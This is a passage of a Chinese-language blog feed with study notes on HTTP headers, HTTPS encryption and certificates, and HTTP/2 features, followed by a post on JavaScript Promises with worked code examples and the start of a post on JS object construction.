<p>通用首部：客户端和服务端都会用的首部<br><img src="/image/header1.png" alt="header1"><br>请求首部<br><img src="/image/header2.png" alt="header2"><br>响应首部<br><img src="/image/header3.png" alt="header3"><br>实体首部<br><img src="/image/header4.png" alt="header4"><br>cookie 相关首部<br><img src="/image/header5.png" alt="header5"></p>
<h1 id="https"><a href="#https" class="headerlink" title="https"></a>https</h1><p>http缺点</p>
<p>1.通信使用明文(不加密)，内容可能会被窃听<br>造成原因：通信线路上的网络设备、光纤等不可能是个人私有物，不排除某个环节会遭到恶意窥视或窃听<br>解决办法：加密处理防止被窃听<br>方式一：通信加密，使用SSL和TLS建立安全通信线路，再在这条线路上进行HTTP通信<br>方式二：内容加密，对HTTP协议传输的内容本身加密，前提要求服务端和客户端都具备加密解密机制</p>
<p>2.不验证通信方的身份，因此可能遭遇伪装<br>造成原因：服务器不管谁发来的请求都会给一个响应，客户端不管是谁的响应都接收<br>解决办法：查明对方证书，证书由第三发颁发，通信前先确认对方证书,验证时要通信的双方后，再继续通信</p>
<p>3.无法证明报文完整性，所以有可能已遭篡改<br>中间人攻击：请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击<br>造成原因：中间人攻击<br>解决办法：MD5和SHA-1等散列值校验的方法,以及用来确认文件的数字签名方法,但以上方法都需要用户本人自己验证</p>
<h2 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+加密+认证+完整性保护 = HTTPS"></a>HTTP+加密+认证+完整性保护 = HTTPS</h2><p>HTTP通信接口部分用SSL和TLS协议代替，即不再是http与TCP通信，而是http和SSL再和TCP通信<br>共享/对称密钥加密：加密和解密用同一个密钥<br>公开密钥加密：<br>使用一对非对称的密钥,一把叫做私有密钥，另一把叫做公开密钥,<br>使用公开密钥进行加密发送密文，收信方收到信息后用私有密钥进行解密<br>公开密钥加密方式比共享密钥加密方式处理起来更麻烦</p>
<p>HTTPS混合加密：在交换密钥环节使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式<br>缺点：无法保证公开密钥本身是真正的公开密钥<br>解决办法：使用数字证书进行验证，客户端根据数字证书机构的公开密钥验证数字签名，从而验证服务器公开密钥<br><img src="/image/header6.png" alt="header6"><br>关于证书：<br>客户端证书一般由银行等特殊业务颁发，因为客户端证书需要费用支出<br>自签名证书无法保证通信真实性<br>中级认证机构的证书可能变成自认证证书<br>HTTPS的安全通信机制<br><img src="/image/header7.png" alt="header7"><br><img src="/image/header8.png" alt="header8"><br>步骤12结束之后，客户端再发送TCP FIN报文来关闭与TCP的通信<br>缺点：<br>1.由于加密解密过程消耗大量CPU以及内存等资源，导致处理速度变慢<br>2.由于SSL通信部分消耗网络资源，处理通信部分又会消耗一定时间，因此相比http又会变慢<br>解决办法：使用SSL加速器以分担负载</p>
<p>不使用https原因：<br>1.客户端要考虑消耗cpu,内存资源，服务器端要考虑负载<br>2.购买证书需要开销</p>
<h1 id="用户认证"><a href="#用户认证" class="headerlink" title="用户认证"></a>用户认证</h1><p>方法有BASIC认证，DIGEST认证，SSL客户端认证，FormBase认证</p>
<h1 id="HTTP-2-O"><a href="#HTTP-2-O" class="headerlink" title="HTTP/2.O"></a>HTTP/2.O</h1><h2 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h2><h3 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h3><p>在http/1.x下,浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞<br>突发性和短时性的 HTTP 连接因为三次握手和慢启动的存在，非常浪费时间(–&gt;单一长连接)<br>(慢启动:TCP连接在一开始会限制连接最大速度，确认数据能够成功传输后，随时间推移才会慢慢提高传输速度)</p>
<h3 id="实现–二进制分帧"><a href="#实现–二进制分帧" class="headerlink" title="实现–二进制分帧"></a>实现–二进制分帧</h3><p>在应用层和传输层之间增加二进制分帧层,应用层生成的报文会分割封装为更小的消息和帧，并进行二进制编码<br>其中首部header和请求主体request body分别被封装为header frame 和data frame<br>同一请求或响应的帧会有相同标志，会按照一定先后顺序被发送，<br>所以不同的请求或者响应可以互相穿插着给到对方<br>最终实现就是<br>一个包含上百个资源的页面，在http1.x协议下会创建多条TCP链接来进行串行请求<br>在http/2.0下只会创建一个长TCP链接，所有的资源请求在压缩处理后一次性发出去,并行地在一个TCP连接上双向交换信息<br>（同一链接上有多个不同方向的数据流在传输。客户端可以一边乱序发送stream，也可以一边接收服务器的响应，而服务器那端同理。）</p>
<p>而且可以对资源设置优先级，优先级能动态的被改变，优先级高的资源能够被更快的下载下来并得到执行</p>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>由于 TCP 连接的减少而使网络拥塞状况得以改善,使拥塞和丢包恢复速度更快<br>单一长连接多资源的方式，减少服务端的链接压力,避免网络开销，内存占用更少,提高连接吞吐量</p>
<h2 id="压缩头部"><a href="#压缩头部" class="headerlink" title="压缩头部"></a>压缩头部</h2><p>通信连接建立之后，由于cookie和user agent很容易膨胀，<br>每次请求的头部如果有相同的部分，还要以纯文本传输重复发送的话，就会造成流量浪费<br>因此在客户端和服务端都存放一个首部表，来跟踪和存储之前发送的键值对，对于相同的头部，不必再通过请求发送，只需发送一次<br>如果首部发生变化，就在压缩时只将变化的数据放在header帧里面进行发送，<br>无论是客户端还是服务器端收到首部帧后，就对首部表进行更新</p>
<h2 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h2><p>就是客户端请求一次资源，服务器给多个响应，这些多个响应很有可能是浏览器解析Html后继续要请求的资源，即主动将资源推送给客户端<br>而客户端可以做的就是可以将他们缓存起来做备用</p>
<h2 id="延伸问题"><a href="#延伸问题" class="headerlink" title="延伸问题"></a>延伸问题</h2><p>1.如何解决推送资源重复或不需要的问题？<br>客户端使用一个简洁的 Cache Digest 来告诉服务器，哪些东西已经在缓存，因此服务器也就会知道哪些是客户端所需要的。<br><a href="https://www.zhihu.com/question/24774343/answer/96586977" target="_blank" rel="external">相关链接</a></p>
<p>2.为什么HTTP2能去掉SSL在HTTP1.x上的开销<br>单一的长连接，减少了SSL握手的开销<br>头部被压缩，减少了数据传输量<br>多路复用能大幅提高传输效率，不用等待上一个请求的响应<br>不用像http1.x那样把多个文件或者资源弄成一个文件或者资源（http1.x常见的优化手段），<br>这时候，缓存就能更容易命中啊（http1.x里面你揉成一团的东西怎么命中缓存？）<br><a href="https://www.qcloud.com/community/article/541321?fromSource=gwzcw.93399.93399.93399" target="_blank" rel="external">相关链接</a></p>
<p><a href="https://www.zhihu.com/question/34074946" target="_blank" rel="external">相关链接</a></p>
<h2 id="遗留疑问"><a href="#遗留疑问" class="headerlink" title="遗留疑问"></a>遗留疑问</h2><p>二进制分帧和TCP切割分包是如何具体实现的，二进制分帧优势具体在哪里？<br>http/2.0各层协议具体工作<br><a href="https://github.com/zqjflash/http2-protocol" target="_blank" rel="external">待读</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;在浏览器的地址栏输入url后发生了什么&quot;&gt;&lt;a href=&quot;#在浏览器的地址栏输入url后发生了什么&quot; class=&quot;headerlink&quot; title=&quot;在浏览器的地址栏输入url后发生了什么&quot;&gt;&lt;/a&gt;在浏览器的地址栏输入url后发生了什么&lt;/h1&gt;&lt;p&gt; 粗
    
    </summary>
    
    
      <category term="html" scheme="http://yoohannah.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>关于promise</title>
    <link href="http://yoohannah.github.io/post/knowledge/promise.html"/>
    <id>http://yoohannah.github.io/post/knowledge/promise.html</id>
    <published>2017-08-31T14:19:37.000Z</published>
    <updated>2017-08-31T14:47:04.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h1><p>Promise 是异步编程的一种解决方案</p>
<h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">var promise = new Promise(function(resolve, reject) &#123;</div><div class="line">  // ... some code</div><div class="line"></div><div class="line">  if (/* 异步操作成功 */)&#123;</div><div class="line">    resolve(value);</div><div class="line">  &#125; else &#123;</div><div class="line">    reject(error);</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">promise</div><div class="line">.then(function(value) &#123;      //resolve(value);回调函数</div><div class="line">  // success</div><div class="line">&#125;, function(error) &#123;         // reject(error);回调函数</div><div class="line">  // failure</div><div class="line">&#125;)</div><div class="line">.catch(function(error) &#123;</div><div class="line">  // 处理 getJSON 和 前一个回调函数运行时发生的错误</div><div class="line">  console.log(&apos;发生错误！&apos;, error);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>1、Promise对象是一个构造函数,用来生成Promise实例,<br>2、Promise构造函数的参数是一个函数,该函数有两个参数,分别是两个函数:resolve和 reject<br>3、resolve函数在promise对象状态从Pending变为Fulfiled时调用,即异步操作成功的时候调用,参数一般为获取的结果，方便回调函数使用，或者另一个promise实例,继续进行回调<br>   reject函数在promise对象状态从Pending变为Rejected时调用,即异步操作失败的时候调用，参数一般为错误Error对象,报出错误<br>4、Promise实例生成以后，可以用then方法分别指定Resolved状态和Rejected状态的回调函数<br>5、then方法有两个参数，均为匿名函数，第一个匿名函数为resolve()的定义,第二个参数为reject()的定义<br>6、Promise对象状态变为Resolved，则会调用then方法指定的回调函数;如果异步操作抛出错误,状态就会变为Rejected,就会调用catch方法指定的回调函数,处理这个错误。<br>   另外,then方法指定的回调函数，如果运行中抛出错误，也会被catch方法捕获。<br>   注意,如果then方法定义了reject(),将不会再调用catch方法,如果then里面没有reject，发生错误时将会调用catch</p>
<h1 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h1><p>1.then方法会在与promise同步的任务完成之后再执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">let promise = new Promise(function(resolve, reject) &#123;</div><div class="line">  console.log(&apos;Promise&apos;);</div><div class="line">  resolve();</div><div class="line">&#125;);</div><div class="line"></div><div class="line">promise.then(function() &#123;</div><div class="line">  console.log(&apos;Resolved.&apos;);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">console.log(&apos;Hi!&apos;);</div><div class="line">//打印顺序</div><div class="line">&quot;Promise&quot;</div><div class="line">&quot;Hi!&quot;</div><div class="line">&quot;Resolved.&quot;</div></pre></td></tr></table></figure></p>
<p>Promise 新建后立即执行，所以首先输出的是Promise。然后,then方法指定的回调函数,将在当前脚本所有同步任务执行完才会执行,所以Resolved最后输出。</p>
<p>2、如果Promise1的resolved返回另一个promise2,那Promise1的then会根据promise2的状态决定执行reject还是resolved<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">var p1 = new Promise(function (resolve, reject) &#123;</div><div class="line">  setTimeout(() =&gt; reject(new Error(&apos;fail&apos;)), 3000)</div><div class="line">&#125;)</div><div class="line"></div><div class="line">var p2 = new Promise(function (resolve, reject) &#123;</div><div class="line">  setTimeout(() =&gt; resolve(p1), 1000)</div><div class="line">&#125;)</div><div class="line"></div><div class="line">p2</div><div class="line">  .then(result =&gt; console.log(result))</div><div class="line">  .catch(error =&gt; console.log(error))</div><div class="line">// Error: fail</div></pre></td></tr></table></figure></p>
<p>上面代码中，p1是一个Promise，3秒之后变为rejected。p2的状态在1秒之后改变，resolve方法返回的是p1。由于p2返回的是另一个 Promise，导致p2自己的状态无效了，由p1的状态决定p2的状态。所以，后面的then语句都变成针对后者（p1）。又过了2秒，p1变为rejected，导致触发catch方法指定的回调函数。</p>
<p>3、在Promise构造函数的参数函数里,在调用resolve()或reject()之后,仍会执行后续语句,但如果是抛错语句将不会执行,同样在抛错语句之后的resolve()调用也不会被执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">var promise = new Promise(function(resolve, reject) &#123;</div><div class="line">  resolve(&apos;ok&apos;);</div><div class="line">  console.log(&apos;1111&apos;)</div><div class="line">&#125;);</div><div class="line">promise</div><div class="line">  .then(function(value) &#123; console.log(value) &#125;)</div><div class="line">  .catch(function(error) &#123; console.log(&apos;报错啦&apos;) &#125;);</div><div class="line">//1111</div><div class="line">//ok</div><div class="line">//因为立即 resolved 的 Promise 是在本轮事件循环的末尾执行，总是晚于本轮循环的同步任务,所以会先打印1111,,再打印ok</div><div class="line"></div><div class="line"></div><div class="line">var promise = new Promise(function(resolve, reject) &#123;</div><div class="line">  return resolve(&apos;ok&apos;);</div><div class="line">  console.log(&apos;1111&apos;)</div><div class="line">&#125;);</div><div class="line">promise</div><div class="line">  .then(function(value) &#123; console.log(value) &#125;)</div><div class="line">  .catch(function(error) &#123; console.log(&apos;报错啦&apos;) &#125;);</div><div class="line">//ok</div><div class="line">//return 方法阻止继续执行后续操作</div><div class="line"></div><div class="line">var promise = new Promise(function(resolve, reject) &#123;</div><div class="line">  resolve(&apos;ok&apos;);</div><div class="line">  throw new Error(&apos;test&apos;);</div><div class="line">&#125;);</div><div class="line">promise</div><div class="line">  .then(function(value) &#123; console.log(value) &#125;)</div><div class="line">  .catch(function(error) &#123; console.log(&apos;报错啦&apos;) &#125;);</div><div class="line">  //ok</div><div class="line"></div><div class="line">var promise = new Promise(function(resolve, reject) &#123;</div><div class="line">  throw new Error(&apos;test&apos;);</div><div class="line">  resolve(&apos;ok&apos;);</div><div class="line"></div><div class="line">&#125;);</div><div class="line">promise</div><div class="line">  .then(function(value) &#123; console.log(value) &#125;)</div><div class="line">  .catch(function(error) &#123; console.log(&apos;报错啦&apos;) &#125;);</div><div class="line">//报错啦</div></pre></td></tr></table></figure></p>
<p>4、then方法会返回一个promise对象，因此可以继续在then函数后面加then函数,这时前面then函数应该会return一个结果值作为后面then函数的参数,<br>   前面then函数如果执行resolve()则后面then函数也会执行resolve(),前面then函数如果执行reject()则后面then函数也会执行reject(),<br>   但如果前面then函数return一个promise对象,那后面的then函数将会根据这个promise的执行结果去执行resolve()还是reject()<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">var promise = new Promise(function(resolve, reject)&#123;</div><div class="line">    resolve(123)</div><div class="line">  &#125;);</div><div class="line">promise.then(function(json) &#123;</div><div class="line">  console.log(&apos;Contents: &apos; + json);</div><div class="line">  return 1223;</div><div class="line">&#125;, function(error) &#123;</div><div class="line">  console.error(&apos;出错了&apos;, error);</div><div class="line">  return &apos;2423&apos;</div><div class="line">&#125;)</div><div class="line">.then(function(val)&#123;</div><div class="line">  console.log(val);</div><div class="line">&#125;,function(val)&#123;</div><div class="line">  console.log(val)</div><div class="line">&#125;);</div><div class="line">//&quot;Contents: 123&quot;</div><div class="line">//1223</div><div class="line"></div><div class="line">var promise = new Promise(function(resolve, reject)&#123;</div><div class="line">    reject(456)</div><div class="line">  &#125;);</div><div class="line">promise.then(function(json) &#123;</div><div class="line">  console.log(&apos;Contents: &apos; + json);</div><div class="line">  return 1223;</div><div class="line">&#125;, function(val,error) &#123;</div><div class="line">  console.log(val);</div><div class="line">  console.error(&apos;出错了&apos;, error);</div><div class="line">  return &apos;2423&apos;</div><div class="line">&#125;)</div><div class="line">.then(function(val)&#123;</div><div class="line">  console.log(val);</div><div class="line">&#125;,function(val)&#123;</div><div class="line">  console.log(val)</div><div class="line">&#125;);</div><div class="line"></div><div class="line">//456</div><div class="line">//&quot;出错了&quot;</div><div class="line">//&quot;2423&quot;</div><div class="line"></div><div class="line">var promise = new Promise(function(resolve, reject)&#123;</div><div class="line">//     resolve(123)</div><div class="line">    reject(456)</div><div class="line">  &#125;);</div><div class="line">var promise1 = new Promise(function(resolve, reject)&#123;</div><div class="line">    resolve(789)</div><div class="line">  &#125;);</div><div class="line">promise.then(function(json) &#123;</div><div class="line">  console.log(&apos;Contents: &apos; + json);</div><div class="line">  return 1223;</div><div class="line">&#125;, function(val,error) &#123;</div><div class="line">  console.log(val);</div><div class="line">  console.error(&apos;出错了&apos;, error);</div><div class="line">  return promise1</div><div class="line">&#125;)</div><div class="line">.then(function(val)&#123;</div><div class="line">  console.log(111+val);</div><div class="line">&#125;,function(val)&#123;</div><div class="line">  console.log(222+val)</div><div class="line">&#125;);</div><div class="line"></div><div class="line">//456</div><div class="line">//&quot;出错了&quot;</div><div class="line">//900</div></pre></td></tr></table></figure></p>
<p>then 方法链式调用箭头函数格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">promise.then(</div><div class="line">  param1 =&gt; &#123;&#125;</div><div class="line">).then(</div><div class="line">  param2 =&gt; &#123;&#125;,</div><div class="line">  err =&gt; &#123;&#125;</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>5、promise 如果发生了错误,无论reject()或者catch在哪一层，会一直向后传递，直到被捕获为止，即遇到reject()或者catch就会抛出来,如果后续所有回调函数中都没有reject()或者catch,错误就不会被抛出来<br>  catch方法会返回一个promise,所以可以继续写then(),catch()抛完错之后会继续执行后面这个then()<br>  catch()里面还可以再抛错，如果catch后面没有reject()或者catch()，错误将不会被抛出来<br>  如果catch之前的promise没有遇到错误,catch之后又有then(),则执行流程会跳过catch,继续执行catch后面的then<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">var promise = new Promise(function(resolve, reject) &#123;</div><div class="line">  throw new Error(&apos;test&apos;);</div><div class="line">&#125;);</div><div class="line">promise</div><div class="line">  .then(function(value) &#123; console.log(value); return &apos;2&apos;&#125;, function() &#123; //捕获test</div><div class="line">  throw new Error(&apos;test1&apos;);</div><div class="line">&#125;)</div><div class="line">  .then(function(value) &#123; console.log(value);return &apos;3&apos; &#125;)</div><div class="line">  .catch(function(error) &#123; console.log(error);return &apos;4&apos;&#125;) //捕获test1</div><div class="line">  .then(function(value) &#123; console.log(value); &#125;) //4</div><div class="line"></div><div class="line"></div><div class="line">var promise = new Promise(function(resolve, reject) &#123;</div><div class="line">  resolve(&apos;1&apos;)</div><div class="line">&#125;);</div><div class="line">promise</div><div class="line">  .then(function(value) &#123; console.log(value); return &apos;2&apos;&#125;, function() &#123; //1</div><div class="line">  throw new Error(&apos;test1&apos;);</div><div class="line">&#125;)</div><div class="line">  .then(function(value) &#123; console.log(value);return &apos;3&apos; &#125;)//2</div><div class="line">  .catch(function(error) &#123; console.log(error) return &apos;4&apos;&#125;)</div><div class="line">  .then(function(value) &#123; console.log(value); &#125;)//3 没遇到错误直接跳过来</div><div class="line"></div><div class="line">var promise = new Promise(function(resolve, reject) &#123;</div><div class="line">  throw new Error(&apos;test&apos;);</div><div class="line">&#125;);</div><div class="line">promise</div><div class="line">  .then(function(value) &#123; console.log(value); return &apos;2&apos;&#125;, function(error) &#123; //捕获test</div><div class="line">  console.log(error)</div><div class="line">  throw new Error(&apos;test1&apos;);</div><div class="line">&#125;)</div><div class="line">  .then(function(value) &#123; console.log(value);return &apos;3&apos; &#125;)</div><div class="line">  .catch(function(error) &#123; console.log(error);throw new Error(&apos;test2&apos;); return &apos;4&apos;&#125;) //捕获test1</div><div class="line">  .then(function(value) &#123; console.log(value); &#125;,function(error)&#123;</div><div class="line">   console.log(error)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<h1 id="API"><a href="#API" class="headerlink" title="API"></a>API</h1><h2 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all"></a>Promise.all</h2><p>用于将多个 Promise 实例，包装成一个新的 Promise 实例<br>var p = Promise.all([p1, p2, p3])<br>p的状态由p1、p2、p3决定，分成两种情况。<br>（1）只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。</p>
<p>（2）只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。</p>
<h2 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race"></a>Promise.race</h2><p>将多个Promise实例，包装成一个新的Promise实例<br>var p = Promise.race([p1, p2, p3]);<br>只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数</p>
<h2 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve"></a>Promise.resolve</h2><p>将现有对象转为Promise对象<br>var Promise = Promise.resolve(参数);</p>
<h2 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject"></a>Promise.reject</h2><p>返回一个新的 Promise 实例，该实例的状态为rejected。<br>var p = Promise.reject(‘出错了’);<br>Promise.reject()方法的参数，会原封不动地作为reject的理由，变成后续方法的参数</p>
<h2 id="done-finally"><a href="#done-finally" class="headerlink" title="done finally"></a>done finally</h2><p>done方法，总是处于回调链的尾端，保证抛出任何可能出现的错误，没有参数<br>finally方法用于指定不管Promise对象最后状态如何，都会执行的操作<br>可以接受一个普通的回调函数作为参数，该函数不管怎样都必须执行。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;promise&quot;&gt;&lt;a href=&quot;#promise&quot; class=&quot;headerlink&quot; title=&quot;promise&quot;&gt;&lt;/a&gt;promise&lt;/h1&gt;&lt;p&gt;Promise 是异步编程的一种解决方案&lt;/p&gt;
&lt;h1 id=&quot;简单使用&quot;&gt;&lt;a href=&quot;#简
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>对象构造和继承</title>
    <link href="http://yoohannah.github.io/post/knowledge/obj.html"/>
    <id>http://yoohannah.github.io/post/knowledge/obj.html</id>
    <published>2017-08-19T01:56:37.000Z</published>
    <updated>2017-08-31T14:47:22.964Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对象特性"><a href="#对象特性" class="headerlink" title="对象特性"></a>对象特性</h1><p>对象的属性在定义时，都带有一些特征值，js通过这些特征值定义他们的行为<br>这些特征值描述对象属性的各种特征,成为对象属性的特性<br>特性是内部值,放在两对方括号中访问<br>特性分为数据属性和访问器属性<br>数据属性：Configurable、Enumerable、Writable、Value<br>访问器属性：Configurable、Enumerable、Get、Set<br>定义某个属性的特性：Object.defineProperty(对象名,对象属性名,{特性1：值,特性2：值…})<br>定义多个属性特性:Object.defineProperties(对象名,{属性1：{特性1：值,特性2：值…},属性2：{特性1:值….}})<br>读取属性:Object.getOwnPropertyDescriptor(对象名,属性名) 返回一个对象</p>
<h1 id="构造对象"><a href="#构造对象" class="headerlink" title="构造对象"></a>构造对象</h1><h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">function createobj(name,age)&#123;</div><div class="line">  var o=new Object();</div><div class="line">  o.name = name;</div><div class="line">  o.age = age;</div><div class="line">  o.sayName = function()&#123;</div><div class="line">    console.log(this.name)</div><div class="line">  &#125;;</div><div class="line">  return o;</div><div class="line">&#125;</div><div class="line">var person1 = createobj(&apos;gray&apos;,25);</div><div class="line">var person2 = createobj(&apos;black&apos;,26);</div><div class="line">person1.sayName()//gray</div><div class="line">person2.sayName()//black</div><div class="line">console.log(typeof person1)//object</div><div class="line">console.log(person1 instanceof createobj) //false</div></pre></td></tr></table></figure>
<p>缺点：无法识别对象类型</p>
<h2 id="寄生构造函数"><a href="#寄生构造函数" class="headerlink" title="寄生构造函数"></a>寄生构造函数</h2><p>定义样子同工厂模式,只不过创建实例时用new 操作符<br>将包装函数叫做 构造函数<br>实例与构造函数及其原型没有关系<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function createobj(name,age)&#123;  //构造函数</div><div class="line">  var o=new Object();</div><div class="line">  o.name = name;</div><div class="line">  o.age = age;</div><div class="line">  o.sayName = function()&#123;</div><div class="line">    console.log(this.name)</div><div class="line">  &#125;;</div><div class="line">  return o;</div><div class="line">&#125;</div><div class="line">var person1 = new createobj(&apos;gray&apos;,25);</div><div class="line">person1.sayName()//gray</div><div class="line">console.log(person1 instanceof createobj) //false</div><div class="line">console.log(person1 instanceof Object) //true</div></pre></td></tr></table></figure></p>
<p>应用:为无法修改构造函数的对象添加方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//给数组增加特殊方法</div><div class="line">function specialArray()&#123;</div><div class="line">  var values = new Array();</div><div class="line">  values.push.apply(values,arguments);</div><div class="line">  values.toPiedString = function(str)&#123; //特殊方法</div><div class="line">    return this.join(str);</div><div class="line">  &#125;;</div><div class="line">  return values;</div><div class="line">&#125;</div><div class="line">var colors = new specialArray(&apos;red&apos;,&apos;blue&apos;);</div><div class="line">console.log(colors.toPiedString(&apos;|&apos;));//&quot;red|blue&quot;</div></pre></td></tr></table></figure></p>
<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">function createobj(name,age)&#123;</div><div class="line">  this.name = name;</div><div class="line">  this.age = age;</div><div class="line">  this.sayName = 